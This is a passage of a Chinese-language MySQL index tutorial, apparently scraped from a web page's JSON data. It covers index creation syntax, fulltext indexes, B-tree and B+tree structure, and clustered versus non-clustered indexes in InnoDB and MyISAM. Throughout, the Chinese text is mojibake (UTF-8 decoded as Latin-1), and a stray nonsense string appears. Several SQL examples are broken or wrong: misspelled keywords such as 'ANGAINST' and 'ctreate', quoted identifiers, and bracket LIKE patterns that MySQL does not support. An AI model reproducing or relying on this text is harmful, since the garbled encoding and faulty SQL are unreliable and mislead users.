ä¼å¯¼è´ç´¢å¼å¤±æãç¹å«çæ¯å¦æå¯¹ä¸»é®ç´¢å¼ä½¿ç¨ï¼= åä¸ä¼ä½¿ç´¢å¼å¤±æï¼å¦æå¯¹ä¸»é®ç´¢å¼æèæ´æ°ç±»åçç´¢å¼ä½¿ç¨ < ç¬¦å·æè > ç¬¦å·ä¸ä¼ä½¿ç´¢å¼å¤±æãï¼ç» erwkjrfhjwkdb åå­¦æéï¼ä¸ç­äºï¼åæ¬ < ç¬¦å·ã> ç¬¦å·åï¼ï¼å¦æå æ»è®°å½çæ¯ä¾å¾å°çè¯ï¼ä¹ä¸ä¼å¤±æï¼\n\n * å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨ IS NULL æè IS NOT NULL ä¼å¯¼è´ç´¢å¼å¤±æã\n\n * å­ç¬¦ä¸²ä¸å åå¼å·ä¼å¯¼è´ç´¢å¼å¤±æãæ´åç¡®çè¯´æ¯ç±»åä¸ä¸è´ä¼å¯¼è´å¤±æï¼æ¯å¦å­æ®µ email æ¯å­ç¬¦ä¸²ç±»åçï¼ä½¿ç¨ WHERE email=99999 åä¼å¯¼è´å¤±è´¥ï¼åºè¯¥æ¹ä¸º WHERE email='99999'ã\n\n * å¨æ¥è¯¢æ¡ä»¶ä¸­ä½¿ç¨ OR è¿æ¥å¤ä¸ªæ¡ä»¶ä¼å¯¼è´ç´¢å¼å¤±æï¼é¤é OR é¾æ¥çæ¯ä¸ªæ¡ä»¶é½å ä¸ç´¢å¼ï¼è¿æ¶åºè¯¥æ¹ä¸ºä¸¤æ¬¡æ¥è¯¢ï¼ç¶åç¨ UNION ALL è¿æ¥èµ·æ¥ã\n\n * å¦ææåºçå­æ®µä½¿ç¨äºç´¢å¼ï¼é£ä¹ select çå­æ®µä¹è¦æ¯ç´¢å¼å­æ®µï¼å¦åç´¢å¼å¤±æãç¹å«çæ¯å¦ææåºçæ¯ä¸»é®ç´¢å¼å select * ä¹ä¸ä¼å¯¼è´ç´¢å¼å¤±æã\n\n * å°½éä¸è¦åæ¬å¤åæåºï¼å¦æä¸å®è¦ï¼æå¥½ä¸ºè¿éåæå»ºç»åç´¢å¼ï¼\n\n\n# ç´¢å¼çä¼å\n\n1ãæå·¦åç¼\n\nç´¢å¼çæå·¦åç¼åå B+Tree ä¸­ç âæå·¦åç¼åçâ æå³ï¼ä¸¾ä¾æ¥è¯´å°±æ¯å¦æè®¾ç½®äºç»åç´¢å¼ < col1,col2,col3 > é£ä¹ä»¥ä¸ 3 ä¸­æåµå¯ä»¥ä½¿ç¨ç´¢å¼ï¼col1ï¼<col1,col2>ï¼<col1,col2,col3>ï¼å¶å®çåï¼æ¯å¦ < col2,col3>ï¼<col1,col3>ï¼col2ï¼col3 ç­ç­é½æ¯ä¸è½ä½¿ç¨ç´¢å¼çã\n\næ ¹æ®æå·¦åç¼ååï¼æä»¬ä¸è¬ææåºåç»é¢çæé«çåæ¾å¨æå·¦è¾¹ï¼ä»¥æ­¤ç±»æ¨ã\n\n2ãå¸¦ç´¢å¼çæ¨¡ç³æ¥è¯¢ä¼å\n\nå¨ä¸é¢å·²ç»æå°ï¼ä½¿ç¨ LIKE è¿è¡æ¨¡ç³æ¥è¯¢çæ¶åï¼'% aaa%' ä¸ä¼ä½¿ç¨ç´¢å¼ï¼ä¹å°±æ¯ç´¢å¼ä¼å¤±æãå¦ææ¯è¿ç§æåµï¼åªè½ä½¿ç¨å¨æç´¢å¼æ¥è¿è¡ä¼åï¼ä¸ææè®²å°ï¼ã\n\n3ãä¸ºæ£ç´¢çæ¡ä»¶æå»ºå¨æç´¢å¼ï¼ç¶åä½¿ç¨\n\nSELECT * FROM tablename MATCH(index_colum) ANGAINST('word');\n\n\n1\n\n\n4ãä½¿ç¨ç­ç´¢å¼\n\nå¯¹ä¸²åè¿è¡ç´¢å¼ï¼å¦æå¯è½åºè¯¥æå®ä¸ä¸ªåç¼é¿åº¦ãä¾å¦ï¼å¦ææä¸ä¸ª CHAR (255) ç åï¼å¦æå¨å 10 ä¸ªæ 20 ä¸ªå­ç¬¦åï¼å¤æ°å¼æ¯æä¸çï¼é£ä¹å°±ä¸è¦å¯¹æ´ä¸ªåè¿è¡ç´¢å¼ãç­ç´¢å¼ä¸ä»å¯ä»¥æé«æ¥è¯¢éåº¦èä¸å¯ä»¥èçç£çç©ºé´å I/O æä½ã",normalizedContent:"# mysql ä¸­ç´¢å¼çè¯­æ³\n\n\n# åå»ºç´¢å¼\n\nå¨åå»ºè¡¨çæ¶åæ·»å ç´¢å¼\n\ncreate table mytable(  \n    id int not null,   \n    username varchar(16) not null,  \n    index [indexname] (username(length))  \n); \n\n\n1\n2\n3\n4\n5\n\n\nå¨åå»ºè¡¨ä»¥åæ·»å ç´¢å¼\n\nalter table my_table add [unique] index index_name(column_name);\n# æè\ncreate index index_name on my_table(column_name);\n\n\n1\n2\n3\n\n\n\n# æ³¨æï¼\n\n 1. ç´¢å¼éè¦å ç¨ç£çç©ºé´ï¼å æ­¤å¨åå»ºç´¢å¼æ¶è¦èèå°ç£çç©ºé´æ¯å¦è¶³å¤\n 2. åå»ºç´¢å¼æ¶éè¦å¯¹è¡¨å éï¼å æ­¤å®éæä½ä¸­éè¦å¨ä¸å¡ç©ºé²æé´è¿è¡\n\n\n# æ ¹æ®ç´¢å¼æ¥è¯¢\n\n--å·ä½æ¥è¯¢ï¼\nselect * from table_name where column_1=column_2;(ä¸ºcolumn_1å»ºç«äºç´¢å¼)\n\n--æèæ¨¡ç³æ¥è¯¢\nselect * from table_name where column_1 like '%ä¸'\nselect * from table_name where column_1 like 'ä¸%'\nselect * from table_name where column_1 like '%ä¸%'\n\nselect * from table_name where column_1 like '_å¥½_'\n\n--å¦æè¦è¡¨ç¤ºå¨å­ç¬¦ä¸²ä¸­æ¢æaåæbï¼é£ä¹æ¥è¯¢è¯­å¥ä¸ºï¼\nselect * from table_name where column_1 like '%a%' and column_1 like '%b%';\n\nselect * from table_name where column_1 like '[å¼ æç]ä¸';  --è¡¨ç¤ºcolumn_1ä¸­æå¹éå¼ ä¸ãæä¸ãçä¸çé½å¯ä»¥\nselect * from table_name where column_1 like '[^å¼ æç]ä¸';  --è¡¨ç¤ºcolumn_1ä¸­æå¹éé¤äºå¼ ä¸ãæä¸ãçä¸çå¶ä»ä¸é½å¯ä»¥\n\n-- å¨æ¨¡ç³æ¥è¯¢ä¸­ï¼%è¡¨ç¤ºä»»æ0ä¸ªæå¤ä¸ªå­ç¬¦ï¼_è¡¨ç¤ºä»»æåä¸ªå­ç¬¦ï¼æä¸ä»æï¼ï¼éå¸¸ç¨æ¥éå¶å­ç¬¦ä¸²é¿åº¦;[]è¡¨ç¤ºå¶ä¸­çæä¸ä¸ªå­ç¬¦ï¼[^]è¡¨ç¤ºé¤äºå¶ä¸­çå­ç¬¦çææå­ç¬¦\n\n--æèå¨å¨æç´¢å¼ä¸­æ¨¡ç³æ¥è¯¢\nselect * from table_name where match(content) against('word1','word2',...);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# å é¤ç´¢å¼\n\ndrop index my_index on tablename;\n--æè\nalter table table_name drop index index_name;\n\n\n1\n2\n3\n\n\n\n# æ¥çè¡¨ä¸­çç´¢å¼\n\nshow index from tablename\n\n\n1\n\n\n\n# æ¥çæ¥è¯¢è¯­å¥ä½¿ç¨ç´¢å¼çæåµ\n\n-- explain æ¥è¯¢è¯­å¥\nexplain select * from table_name where column_1='123';\n\n\n1\n2\n\n\n\n# ç´¢å¼çä¼ç¼ºç¹\n\nä¼å¿ï¼å¯ä»¥å¿«éæ£ç´¢ï¼åå° i/o æ¬¡æ°ï¼å å¿«æ£ç´¢éåº¦ï¼æ ¹æ®ç´¢å¼åç»åæåºï¼å¯ä»¥å å¿«åç»åæåºï¼\n\nå£å¿ï¼ç´¢å¼æ¬èº«ä¹æ¯è¡¨ï¼å æ­¤ä¼å ç¨å­å¨ç©ºé´ï¼ä¸è¬æ¥è¯´ï¼ç´¢å¼è¡¨å ç¨çç©ºé´çæ°æ®è¡¨ç 1.5 åï¼ç´¢å¼è¡¨çç»´æ¤ååå»ºéè¦æ¶é´ææ¬ï¼è¿ä¸ªææ¬éçæ°æ®éå¢å¤§èå¢å¤§ï¼æå»ºç´¢å¼ä¼éä½æ°æ®è¡¨çä¿®æ¹æä½ï¼å é¤ï¼æ·»å ï¼ä¿®æ¹ï¼çæçï¼å ä¸ºå¨ä¿®æ¹æ°æ®è¡¨çåæ¶è¿éè¦ä¿®æ¹ç´¢å¼è¡¨ï¼\n\n\n# ç´¢å¼çåç±»\n\n\n# å¸¸è§çç´¢å¼ç±»åæï¼ä¸»é®ç´¢å¼ãå¯ä¸ç´¢å¼ãæ®éç´¢å¼ãå¨æç´¢å¼ãç»åç´¢å¼\n\n1ãä¸»é®ç´¢å¼ï¼å³ä¸»ç´¢å¼ï¼æ ¹æ®ä¸»é® pk_clolumï¼lengthï¼å»ºç«ç´¢å¼ï¼ä¸åè®¸éå¤ï¼ä¸åè®¸ç©ºå¼ï¼\n\nalter table 'table_name' add primary key pk_index('col');\n\n\n1\n\n\n2ãå¯ä¸ç´¢å¼ï¼ç¨æ¥å»ºç«ç´¢å¼çåçå¼å¿é¡»æ¯å¯ä¸çï¼åè®¸ç©ºå¼\n\nalter table 'table_name' add unique index_name('col');\n\n\n1\n\n\n3ãæ®éç´¢å¼ï¼ç¨è¡¨ä¸­çæ®éåæå»ºçç´¢å¼ï¼æ²¡æä»»ä½éå¶\n\nalter table 'table_name' add index index_name('col');\n\n\n1\n\n\n4ãå¨æç´¢å¼ï¼ç¨å¤§ææ¬å¯¹è±¡çåæå»ºçç´¢å¼ï¼ä¸ä¸é¨åä¼è®²è§£ï¼\n\nalter table 'table_name' add fulltext index ft_index('col');\n\n\n1\n\n\n5ãç»åç´¢å¼ï¼ç¨å¤ä¸ªåç»åæå»ºçç´¢å¼ï¼è¿å¤ä¸ªåä¸­çå¼ä¸åè®¸æç©ºå¼\n\nalter table 'table_name' add index index_name('col1','col2','col3');\n\n\n1\n\n * éµå¾ª âæå·¦åç¼â ååï¼ææå¸¸ç¨ä½ä¸ºæ£ç´¢ææåºçåæ¾å¨æå·¦ï¼ä¾æ¬¡éåï¼ç»åç´¢å¼ç¸å½äºå»ºç«äº col1,col1col2,col1col2col3 ä¸ä¸ªç´¢å¼ï¼è col2 æè col3 æ¯ä¸è½ä½¿ç¨ç´¢å¼çã\n * å¨ä½¿ç¨ç»åç´¢å¼çæ¶åå¯è½å ä¸ºååé¿åº¦è¿é¿èå¯¼è´ç´¢å¼ç key å¤ªå¤§ï¼å¯¼è´æçéä½ï¼å¨åè®¸çæåµä¸ï¼å¯ä»¥åªå col1 å col2 çåå ä¸ªå­ç¬¦ä½ä¸ºç´¢å¼\n * alter table 'table_name' add index index_name(col1(4),col2(3))ï¼\n   è¡¨ç¤ºä½¿ç¨ col1 çå 4 ä¸ªå­ç¬¦å col2 çå 3 ä¸ªå­ç¬¦ä½ä¸ºç´¢å¼\n\n\n# ç´¢å¼çå®ç°åç\n\nmysql æ¯æè¯¸å¤å­å¨å¼æï¼èåç§å­å¨å¼æå¯¹ç´¢å¼çæ¯æä¹åä¸ç¸åï¼å æ­¤ mysql æ°æ®åºæ¯æå¤ç§ç´¢å¼ç±»åï¼å¦ btree ç´¢å¼ï¼b+tree ç´¢å¼ï¼åå¸ç´¢å¼ï¼å¨æç´¢å¼ç­ç­ï¼\n\n\n# åå¸ç´¢å¼ï¼\n\nåªæ memoryï¼åå­ï¼å­å¨å¼ææ¯æåå¸ç´¢å¼ï¼åå¸ç´¢å¼ç¨ç´¢å¼åçå¼è®¡ç®è¯¥å¼ç hashcodeï¼ç¶åå¨ hashcode ç¸åºçä½ç½®å­æ§è¯¥å¼æå¨è¡æ°æ®çç©çä½ç½®ï¼å ä¸ºä½¿ç¨æ£åç®æ³ï¼å æ­¤è®¿é®éåº¦éå¸¸å¿«ï¼ä½æ¯ä¸ä¸ªå¼åªè½å¯¹åºä¸ä¸ª hashcodeï¼èä¸æ¯æ£åçåå¸æ¹å¼ï¼å æ­¤åå¸ç´¢å¼ä¸æ¯æèå´æ¥æ¾åæåºçåè½ã\n\n\n# å¨æç´¢å¼ï¼\n\nfulltextï¼å¨æï¼ç´¢å¼ï¼ä»å¯ç¨äº myisam å innodbï¼éå¯¹è¾å¤§çæ°æ®ï¼çæå¨æç´¢å¼éå¸¸çæ¶èæ¶é´åç©ºé´ãå¯¹äºææ¬çå¤§å¯¹è±¡ï¼æèè¾å¤§ç char ç±»åçæ°æ®ï¼å¦æä½¿ç¨æ®éç´¢å¼ï¼é£ä¹å¹éææ¬åå ä¸ªå­ç¬¦è¿æ¯å¯è¡çï¼ä½æ¯æ³è¦å¹éææ¬ä¸­é´çå ä¸ªåè¯ï¼é£ä¹å°±è¦ä½¿ç¨ like % word% æ¥å¹éï¼è¿æ ·éè¦å¾é¿çæ¶é´æ¥å¤çï¼ååºæ¶é´ä¼å¤§å¤§å¢å ï¼è¿ç§æåµï¼å°±å¯ä½¿ç¨æ¶ fulltext ç´¢å¼äºï¼å¨çæ fulltext ç´¢å¼æ¶ï¼ä¼ä¸ºææ¬çæä¸ä»½åè¯çæ¸åï¼å¨ç´¢å¼æ¶åæ ¹æ®è¿ä¸ªåè¯çæ¸åæ¥ç´¢å¼ãfulltext å¯ä»¥å¨åå»ºè¡¨çæ¶ååå»ºï¼ä¹å¯ä»¥å¨éè¦çæ¶åç¨ alter æè create index æ¥æ·»å ï¼\n\n--åå»ºè¡¨çæ¶åæ·»å fulltextç´¢å¼\nctreate table my_table(\n    id int(10) primary key,\n    name varchar(10) not null,\n    my_text text,\n    fulltext(my_text)\n)engine=myisam default charset=utf8;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n--åå»ºè¡¨ä»¥åï¼å¨éè¦çæ¶åæ·»å fulltextç´¢å¼\nalter table my_table add fulltext index ft_index(column_name);\n\n\n1\n2\n\n\nå¨æç´¢å¼çæ¥è¯¢ä¹æèªå·±ç¹æ®çè¯­æ³ï¼èä¸è½ä½¿ç¨ like % æ¥è¯¢å­ç¬¦ä¸² % çæ¨¡ç³æ¥è¯¢è¯­æ³\n\nselect * from table_name match(ft_index) against('æ¥è¯¢å­ç¬¦ä¸²');\n\n\n1\n\n\n\n# æ³¨æï¼\n\n * å¯¹äºè¾å¤§çæ°æ®éï¼ææ°æ®æ·»å å°ä¸ä¸ªæ²¡æ fulltext ç´¢å¼çè¡¨ï¼ç¶åæ·»å  fulltext ç´¢å¼çéåº¦æ¯ææ°æ®æ·»å å°ä¸ä¸ªå·²ç»æ fulltext ç´¢å¼çè¡¨å¿«ã\n\n * 5.6 çæ¬åç mysql èªå¸¦çå¨æç´¢å¼åªè½ç¨äº myisam å­å¨å¼æï¼å¦ææ¯å¶å®æ°æ®å¼æï¼é£ä¹å¨æç´¢å¼ä¸ä¼çæã5.6 çæ¬ä¹å innodb å­å¨å¼æå¼å§æ¯æå¨æç´¢å¼\n\n * å¨ mysql ä¸­ï¼å¨æç´¢å¼æ¯éè±ææç¨ï¼ç®åå¯¹ä¸­æè¿ä¸æ¯æã5.7 çæ¬ä¹åéè¿ä½¿ç¨ ngram æä»¶å¼å§æ¯æä¸­æã\n\n * å¨ mysql ä¸­ï¼å¦ææ£ç´¢çå­ç¬¦ä¸²å¤ªç­åæ æ³æ£ç´¢å¾å°é¢æçç»æï¼æ£ç´¢çå­ç¬¦ä¸²é¿åº¦è³å°ä¸º 4 å­èï¼æ­¤å¤ï¼å¦ææ£ç´¢çå­ç¬¦åæ¬åæ­¢è¯ï¼é£ä¹åæ­¢è¯ä¼è¢«å¿½ç¥ã\n\n\n# btree ç´¢å¼å b+tree ç´¢å¼\n\n1ãbtree ç´¢å¼\nbtree æ¯å¹³è¡¡æç´¢å¤åæ ï¼è®¾æ çåº¦ä¸º 2dï¼d>1ï¼ï¼é«åº¦ä¸º hï¼é£ä¹ btree è¦æ»¡è¶³ä»¥ä¸ä¸æ¡ä»¶ï¼\n\n * æ¯ä¸ªå¶å­ç»ç¹çé«åº¦ä¸æ ·ï¼ç­äº hï¼\n * æ¯ä¸ªéå¶å­ç»ç¹ç± n-1 ä¸ª key å n ä¸ªæé point ç»æï¼å¶ä¸­ d<=n<=2d,key å point ç¸äºé´éï¼ç»ç¹ä¸¤ç«¯ä¸å®æ¯ keyï¼\n * å¶å­ç»ç¹æéé½ä¸º nullï¼\n * éå¶å­ç»ç¹ç key é½æ¯ [key,data] äºåç»ï¼å¶ä¸­ key è¡¨ç¤ºä½ä¸ºç´¢å¼çé®ï¼data ä¸ºé®å¼æå¨è¡çæ°æ®ï¼\n   ç»æå¦ä¸ï¼\n\n\n\nå¨ btree çæºæä¸ï¼å°±å¯ä»¥ä½¿ç¨äºåæ¥æ¾çæ¥æ¾æ¹å¼ï¼æ¥æ¾å¤æåº¦ä¸º h*log (n)ï¼ä¸è¬æ¥è¯´æ çé«åº¦æ¯å¾å°çï¼ä¸è¬ä¸º 3 å·¦å³ï¼å æ­¤ btree æ¯ä¸ä¸ªéå¸¸é«æçæ¥æ¾ç»æã\n\n2ãb+tree ç´¢å¼\nb+tree æ¯ btree çä¸ä¸ªåç§ï¼è®¾ d ä¸ºæ çåº¦æ°ï¼h ä¸ºæ çé«åº¦ï¼b+tree å btree çä¸åä¸»è¦å¨äºï¼\n\n * b+tree ä¸­çéå¶å­ç»ç¹ä¸å­å¨æ°æ®ï¼åªå­å¨é®å¼ï¼\n * b+tree çå¶å­ç»ç¹æ²¡ææéï¼ææé®å¼é½ä¼åºç°å¨å¶å­ç»ç¹ä¸ï¼ä¸ key å­å¨çé®å¼å¯¹åº data æ°æ®çç©çå°åï¼\n * b+tree çæ¯ä¸ªéå¶å­èç¹ç± n ä¸ªé®å¼ key å n ä¸ªæé point ç»æï¼\n   b+tree çç»æå¦ä¸ï¼\n\n\n\nb+tree å¯¹æ¯ btree çä¼ç¹ï¼\n\n * ç£çè¯»åä»£ä»·æ´ä½\n   ä¸è¬æ¥è¯´ b+tree æ¯ btree æ´éåå®ç°å¤å­çç´¢å¼ç»æï¼å ä¸ºå­å¨å¼æçè®¾è®¡ä¸å®¶å·§å¦çå©ç¨äºå¤å­ï¼ç£çï¼çå­å¨ç»æï¼å³ç£ççæå°å­å¨åä½æ¯æåºï¼sectorï¼ï¼èæä½ç³»ç»çåï¼blockï¼éå¸¸æ¯æ´æ°åç sectorï¼æä½ç³»ç»ä»¥é¡µï¼pageï¼ä¸ºåä½ç®¡çåå­ï¼ä¸é¡µï¼pageï¼éå¸¸é»è®¤ä¸º 4kï¼æ°æ®åºçé¡µéå¸¸è®¾ç½®ä¸ºæä½ç³»ç»é¡µçæ´æ°åï¼å æ­¤ç´¢å¼ç»æçèç¹è¢«è®¾è®¡ä¸ºä¸ä¸ªé¡µçå¤§å°ï¼ç¶åå©ç¨å¤å­ç âé¢è¯»åâ ååï¼æ¯æ¬¡è¯»åçæ¶åï¼ææ´ä¸ªèç¹çæ°æ®è¯»åå°åå­ä¸­ï¼ç¶åå¨åå­ä¸­æ¥æ¾ï¼å·²ç¥åå­çè¯»åéåº¦æ¯å¤å­è¯»å i/o éåº¦çå ç¾åï¼é£ä¹æåæ¥æ¾éåº¦çå³é®å°±å¨äºå°½å¯è½å°çç£ç i/oï¼é£ä¹å¯ä»¥ç¥éï¼æ¯ä¸ªèç¹ä¸­ç key ä¸ªæ°è¶å¤ï¼é£ä¹æ çé«åº¦è¶å°ï¼éè¦ i/o çæ¬¡æ°è¶å°ï¼å æ­¤ä¸è¬æ¥è¯´ b+tree æ¯ btree æ´å¿«ï¼å ä¸º b+tree çéå¶èç¹ä¸­ä¸å­å¨ dataï¼å°±å¯ä»¥å­å¨æ´å¤ç keyã\n\n * æ¥è¯¢éåº¦æ´ç¨³å®\n   ç±äº b+tree éå¶å­èç¹ä¸å­å¨æ°æ®ï¼dataï¼ï¼å æ­¤ææçæ°æ®é½è¦æ¥è¯¢è³å¶å­èç¹ï¼èå¶å­èç¹çé«åº¦é½æ¯ç¸åçï¼å æ­¤æææ°æ®çæ¥è¯¢éåº¦é½æ¯ä¸æ ·çã\n   æ´å¤æä½ç³»ç»åå®¹åèï¼\n   ç¡¬çç»æ\n   æåºãåãç°ãé¡µçåºå«\n   æä½ç³»ç»å±ä¼åï¼è¿é¶ï¼åå­¦ä¸ç¨çï¼\n\nå¸¦é¡ºåºç´¢å¼ç b+treeï¼\nå¾å¤å­å¨å¼æå¨ b+tree çåºç¡ä¸è¿è¡äºä¼åï¼æ·»å äºæåç¸é»å¶èç¹çæéï¼å½¢æäºå¸¦æé¡ºåºè®¿é®æéç b+treeï¼è¿æ ·åæ¯ä¸ºäºæé«åºé´æ¥æ¾çæçï¼åªè¦æ¾å°ç¬¬ä¸ä¸ªå¼é£ä¹å°±å¯ä»¥é¡ºåºçæ¥æ¾åé¢çå¼\nb+tree çç»æå¦ä¸ï¼\n\n\n\n3ãèç°ç´¢å¼åéèç°ç´¢å¼\nåæäº mysql çç´¢å¼ç»æçå®ç°åçï¼ç¶åæä»¬æ¥ççå·ä½çå­å¨å¼ææä¹å®ç°ç´¢å¼ç»æçï¼mysql ä¸­æå¸¸è§çä¸¤ç§å­å¨å¼æåå«æ¯ myisam å innodbï¼åå«å®ç°äºéèç°ç´¢å¼åèç°ç´¢å¼ã\n\nèç°ç´¢å¼çè§£éæ¯ï¼èç°ç´¢å¼çé¡ºåºå°±æ¯æ°æ®çç©çå­å¨é¡ºåº\n\néèç°ç´¢å¼çè§£éæ¯ï¼ç´¢å¼é¡ºåºä¸æ°æ®ç©çæåé¡ºåºæ å³\n\nï¼è¿æ ·è¯´èµ·æ¥å¹¶ä¸å¥½çè§£ï¼è®©äººæ¸ä¸çå¤´èï¼æ¸ç»§ç»­çä¸æï¼å¹¶å¨æå¾ä¸æ¹å¯¹ä¸è¿°ä¸¤å¥è¯æè§£éï¼\n\né¦åè¦ä»ç»å ä¸ªæ¦å¿µï¼å¨ç´¢å¼çåç±»ä¸­ï¼æä»¬å¯ä»¥æç§ç´¢å¼çé®æ¯å¦ä¸ºä¸»é®æ¥åä¸º âä¸»ç´¢å¼â å âè¾å©ç´¢å¼âï¼ä½¿ç¨ä¸»é®é®å¼å»ºç«çç´¢å¼ç§°ä¸º âä¸»ç´¢å¼âï¼å¶å®çç§°ä¸º âè¾å©ç´¢å¼âãå æ­¤ä¸»ç´¢å¼åªè½æä¸ä¸ªï¼è¾å©ç´¢å¼å¯ä»¥æå¾å¤ä¸ªã\n\n4ãmyisamââ éèç°ç´¢å¼\n\n * myisam å­å¨å¼æéç¨çæ¯éèç°ç´¢å¼ï¼éèç°ç´¢å¼çä¸»ç´¢å¼åè¾å©ç´¢å¼å ä¹æ¯ä¸æ ·çï¼åªæ¯ä¸»ç´¢å¼ä¸åè®¸éå¤ï¼ä¸åè®¸ç©ºå¼ï¼ä»ä»¬çå¶å­ç»ç¹ç key é½å­å¨æåé®å¼å¯¹åºçæ°æ®çç©çå°åã\n * éèç°ç´¢å¼çæ°æ®è¡¨åç´¢å¼è¡¨æ¯åå¼å­å¨çã\n * éèç°ç´¢å¼ä¸­çæ°æ®æ¯æ ¹æ®æ°æ®çæå¥é¡ºåºä¿å­ãå æ­¤éèç°ç´¢å¼æ´éååä¸ªæ°æ®çæ¥è¯¢ãæå¥é¡ºåºä¸åé®å¼å½±åã\n * åªæå¨ myisam ä¸­æè½ä½¿ç¨ fulltext ç´¢å¼ã(mysql5.6 ä»¥å innodb ä¹æ¯æå¨æç´¢å¼)\n\næå¼å§æä¸ç´ä¸ææ¢ç¶éèç°ç´¢å¼çä¸»ç´¢å¼åè¾å©ç´¢å¼æåç¸åçåå®¹ï¼ä¸ºä»ä¹è¿è¦è¾å©ç´¢å¼è¿ä¸ªä¸è¥¿å¢ï¼åæ¥ææç½ç´¢å¼ä¸å°±æ¯ç¨æ¥æ¥è¯¢çåï¼ç¨å¨é£äºå°æ¹å¢ï¼ä¸å°±æ¯ where å order by è¯­å¥åé¢åï¼é£ä¹å¦ææ¥è¯¢çæ¡ä»¶ä¸æ¯ä¸»é®æä¹åå¢ï¼è¿ä¸ªæ¶åå°±éè¦è¾å©ç´¢å¼äºã\n\n5ãinnodbââ èç°ç´¢å¼\n\n * èç°ç´¢å¼çä¸»ç´¢å¼çå¶å­ç»ç¹å­å¨çæ¯é®å¼å¯¹åºçæ°æ®æ¬èº«ï¼è¾å©ç´¢å¼çå¶å­ç»ç¹å­å¨çæ¯é®å¼å¯¹åºçæ°æ®çä¸»é®é®å¼ãå æ­¤ä¸»é®çå¼é¿åº¦è¶å°è¶å¥½ï¼ç±»åè¶ç®åè¶å¥½ã\n * èç°ç´¢å¼çæ°æ®åä¸»é®ç´¢å¼å­å¨å¨ä¸èµ·ã\n * èç°ç´¢å¼çæ°æ®æ¯æ ¹æ®ä¸»é®çé¡ºåºä¿å­ãå æ­¤éåæä¸»é®ç´¢å¼çåºé´æ¥æ¾ï¼å¯ä»¥ææ´å°çç£ç i/oï¼å å¿«æ¥è¯¢éåº¦ãä½æ¯ä¹æ¯å ä¸ºè¿ä¸ªåå ï¼èç°ç´¢å¼çæå¥é¡ºåºæå¥½æç§ä¸»é®åè°çé¡ºåºæå¥ï¼å¦åä¼é¢ç¹çå¼èµ·é¡µåè£ï¼ä¸¥éå½±åæ§è½ã\n * å¨ innodb ä¸­ï¼å¦æåªéè¦æ¥æ¾ç´¢å¼çåï¼å°±å°½éä¸è¦å å¥å¶å®çåï¼è¿æ ·ä¼æé«æ¥è¯¢æçã\n   ä½¿ç¨ä¸»ç´¢å¼çæ¶åï¼æ´éåä½¿ç¨èç°ç´¢å¼ï¼å ä¸ºèç°ç´¢å¼åªéè¦æ¥æ¾ä¸æ¬¡ï¼èéèç°ç´¢å¼å¨æ¥å°æ°æ®çå°ååï¼è¿è¦è¿è¡ä¸æ¬¡ i/o æ¥æ¾æ°æ®ã\n\nå ä¸ºèç°è¾å©ç´¢å¼å­å¨çæ¯ä¸»é®çé®å¼ï¼å æ­¤å¯ä»¥å¨æ°æ®è¡ç§»å¨æèé¡µåè£çæ¶åéä½ææ¬ï¼å ä¸ºè¿æ¶ä¸ç¨ç»´æ¤è¾å©ç´¢å¼ãä½æ¯ç±äºä¸»ç´¢å¼å­å¨çæ¯æ°æ®æ¬èº«ï¼å æ­¤èç°ç´¢å¼ä¼å ç¨æ´å¤çç©ºé´ã\n\nèç°ç´¢å¼å¨æå¥æ°æ°æ®çæ¶åæ¯éèç°ç´¢å¼æ¢å¾å¤ï¼å ä¸ºæå¥æ°æ°æ®æ¶éè¦æ£æµä¸»é®æ¯å¦éå¤ï¼è¿éè¦éåä¸»ç´¢å¼çææå¶èç¹ï¼èéèç°ç´¢å¼çå¶èç¹ä¿å­çæ¯æ°æ®å°åï¼å ç¨ç©ºé´å°ï¼å æ­¤åå¸éä¸­ï¼æ¥è¯¢çæ¶å i/o æ´å°ï¼ä½èç°ç´¢å¼çä¸»ç´¢å¼ä¸­å­å¨çæ¯æ°æ®æ¬èº«ï¼æ°æ®å ç¨ç©ºé´å¤§ï¼åå¸èå´æ´å¤§ï¼å¯è½å ç¨å¥½å¤çæåºï¼å æ­¤éè¦æ´å¤æ¬¡ i/o æè½éåå®æ¯ã\n\nä¸å¾å¯ä»¥å½¢è±¡çè¯´æèç°ç´¢å¼åéèç°ç´¢å¼çåºå«ï¼\n\n\n\nä»ä¸å¾ä¸­å¯ä»¥çå°èç°ç´¢å¼çè¾å©ç´¢å¼çå¶å­èç¹ç data å­å¨çæ¯ä¸»é®çå¼ï¼ä¸»ç´¢å¼çå¶å­èç¹ç data å­å¨çæ¯æ°æ®æ¬èº«ï¼ä¹å°±æ¯è¯´æ°æ®åç´¢å¼å­å¨å¨ä¸èµ·ï¼å¹¶ä¸ç´¢å¼æ¥è¯¢å°çå°æ¹å°±æ¯æ°æ®ï¼dataï¼æ¬èº«ï¼é£ä¹ç´¢å¼çé¡ºåºåæ°æ®æ¬èº«çé¡ºåºå°±æ¯ç¸åçï¼\n\nèéèç°ç´¢å¼çä¸»ç´¢å¼åè¾å©ç´¢å¼çå¶å­èç¹ç data é½æ¯å­å¨çæ°æ®çç©çå°åï¼ä¹å°±æ¯è¯´ç´¢å¼åæ°æ®å¹¶ä¸æ¯å­å¨å¨ä¸èµ·çï¼æ°æ®çé¡ºåºåç´¢å¼çé¡ºåºå¹¶æ²¡æä»»ä½å³ç³»ï¼ä¹å°±æ¯ç´¢å¼é¡ºåºä¸æ°æ®ç©çæåé¡ºåºæ å³ã\n\næ­¤å¤ myisam å innodb çåºå«æ»ç»å¦ä¸ï¼\n\n\n\n6ãæ»ç»\n\n * innodb æ¯æäºå¡ï¼æ¯æè¡çº§å«éå®ï¼æ¯æ b-treeãfull-text ç­ç´¢å¼ï¼ä¸æ¯æ hash ç´¢å¼ï¼\n * myisam ä¸æ¯æäºå¡ï¼æ¯æè¡¨çº§å«éå®ï¼æ¯æ b-treeãfull-text ç­ç´¢å¼ï¼ä¸æ¯æ hash ç´¢å¼ï¼\n   æ­¤å¤ï¼memory ä¸æ¯æäºå¡ï¼æ¯æè¡¨çº§å«éå®ï¼æ¯æ b-treeãhash ç­ç´¢å¼ï¼ä¸æ¯æ full-text ç´¢å¼ï¼\n\n\n# ç´¢å¼çä½¿ç¨ç­ç¥\n\n\n# ä»ä¹æ¶åè¦ä½¿ç¨ç´¢å¼ï¼\n\n * ä¸»é®èªå¨å»ºç«å¯ä¸ç´¢å¼ï¼\n * 